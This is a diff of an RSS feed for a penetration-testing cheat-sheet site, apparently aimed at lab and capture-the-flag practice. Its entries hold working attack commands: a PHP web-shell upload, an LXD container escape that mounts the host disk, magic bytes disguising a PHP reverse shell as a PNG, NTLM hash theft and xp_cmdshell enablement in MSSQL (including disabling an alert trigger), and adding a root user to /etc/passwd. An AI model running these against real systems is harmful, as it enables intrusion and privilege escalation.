@@ -8,11 +8,11 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Advance curl</title>
-      <link>https://tldrbins.github.io/advance_curl/</link>
+      <title>Apache</title>
+      <link>https://tldrbins.github.io/apache/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description> Advance curl # PUT request with a file curl -X PUT http://example.com/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://example.com/test.txt --data-binary @test.aspx # POST request with with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; &amp;#39;http://example.com/upload&amp;#39; </description>
+      <guid>https://tldrbins.github.io/apache/</guid>
+      <description> Check Apache version apache&#xA;Config location /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/default-ssl.conf </description>
     </item>
     <item>
       <title>Compressed Files</title>
@@ -29,11 +29,25 @@
       <description>Simply Catch HTTP Request webhook.site webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net # Start a local HTTP server python3 -m http.server 3000 ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
+      <title>Curl</title>
+      <link>https://tldrbins.github.io/advance_curl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_curl/</guid>
+      <description> Advance curl # PUT request with a file curl -X PUT http://example.com/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://example.com/test.txt --data-binary @test.aspx # POST request with with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; &amp;#39;http://example.com/upload&amp;#39; </description>
+    </item>
+    <item>
       <title>DNS Enum</title>
       <link>https://tldrbins.github.io/dns_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dns_enum/</guid>
       <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
+    </item>
+    <item>
+      <title>dotnet</title>
+      <link>https://tldrbins.github.io/dotnet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/dotnet/</guid>
+      <description> dotnet Compile c# project from Linux Download dotnet&#xA;# Check if dotnet installed dotnet --info mkdir new_project cd new_project dot new console # Add dependencies if needed dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 # Add code to Program.cs # Run dotnet run </description>
     </item>
     <item>
       <title>Drupal</title>
@@ -68,7 +82,7 @@
       <link>https://tldrbins.github.io/find/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/find/</guid>
-      <description> Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls </description>
+      <description> Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc </description>
     </item>
     <item>
       <title>Flask Cookie</title>
@@ -103,7 +117,14 @@
       <link>https://tldrbins.github.io/lxd/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/lxd/</guid>
-      <description> Basic Commands # Check if user in lxd group id # List containers lxc list # List image lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root </description>
+      <description>Basic Commands # Check if user in lxd group id # List containers lxc list # List image lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.</description>
+    </item>
+    <item>
+      <title>Magic Bytes</title>
+      <link>https://tldrbins.github.io/magic_bytes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/magic_bytes/</guid>
+      <description> png echo &amp;#39;89 50 4E 47 0D 0A 1A 0A&amp;#39; | xxd -p -r &amp;gt;&amp;gt; php-reverse-shell.php.png cat php-reverse-shell.php &amp;gt;&amp;gt; php-reverse-shell.php.png </description>
     </item>
     <item>
       <title>Memory Dump</title>
@@ -141,6 +162,13 @@
       <description> General Connect to Mongo Database mongo 10.10.11.10:27017 Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() </description>
     </item>
     <item>
+      <title>Mount Share</title>
+      <link>https://tldrbins.github.io/share_mount/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/share_mount/</guid>
+      <description> NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check how shares are mounted cat /etc/exports # root_squash : running as root on local system will be treated as the default nobody user in target # no_all_squash: every other users permission will translate from local system to target SMB Mount share sudo mount -t cifs &amp;#34;//10.10.11.10/Remote Shares&amp;#34; /mnt </description>
+    </item>
+    <item>
       <title>MSSQL General</title>
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -159,7 +187,7 @@
       <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
-      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
+      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
     </item>
     <item>
       <title>Mysql General</title>
@@ -215,7 +243,7 @@
       <link>https://tldrbins.github.io/padding_oracle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/padding_oracle/</guid>
-      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 # Forge cookie, e.g., user=admin padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 -plaintext user=admin </description>
+      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 # Forge cookie value, e.g., user=admin padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 -plaintext user=admin </description>
     </item>
     <item>
       <title>Password Cracking</title>
@@ -239,18 +267,11 @@
       <description> searchsploit # Search service with specific version # For example: samba 3.0 searchsploit samba 3.0 # Read the exploit searchsploit -x unix/remote/16320.rb # Copy the exploit searchsploit -m unix/remote/16320.rb </description>
     </item>
     <item>
-      <title>Share Mount</title>
-      <link>https://tldrbins.github.io/share_mount/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/share_mount/</guid>
-      <description> Share Mount #Mount smb share locally for easy access sudo mount -t cifs &amp;#34;//10.10.11.10/Remote Shares&amp;#34; /mnt </description>
-    </item>
-    <item>
       <title>SMB Enum</title>
       <link>https://tldrbins.github.io/smb_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
-      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null # List known share smbmap -H 10.10.11.10 -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.</description>
+      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 -u null --no-banner # List known share smbmap -H 10.10.11.10 -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.</description>
     </item>
     <item>
       <title>SMB Server</title>
@@ -271,7 +292,7 @@
       <link>https://tldrbins.github.io/sql_injection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sql_injection/</guid>
-      <description>sqlmap Download sqlmap&#xA;# In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string # Add a string to indicate injection succeed (e.g., Invalid User vs Error Occurred) sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string &amp;#39;Invalid User&amp;#39; # Get databases sqlmap -r request --batch --banner --proxy=http://127.</description>
+      <description>sqlmap Download sqlmap&#xA;# In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
     </item>
     <item>
       <title>SSH</title>
@@ -342,6 +363,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/wordpress/</guid>
       <description> wpscan Download wpscan&#xA;# HTTP wpscan --url http://10.10.11.10 -e ap,t,tt,u # HTTPS wpscan --url https://10.10.11.10 -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://10.10.11.10 -e ap,t,tt,u --api-token API_KEY </description>
+    </item>
+    <item>
+      <title>Writable /etc/passwd</title>
+      <link>https://tldrbins.github.io/passwd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/passwd/</guid>
+      <description> Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo &amp;#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd # Get root shell su - user </description>
     </item>
   </channel>
 </rss>
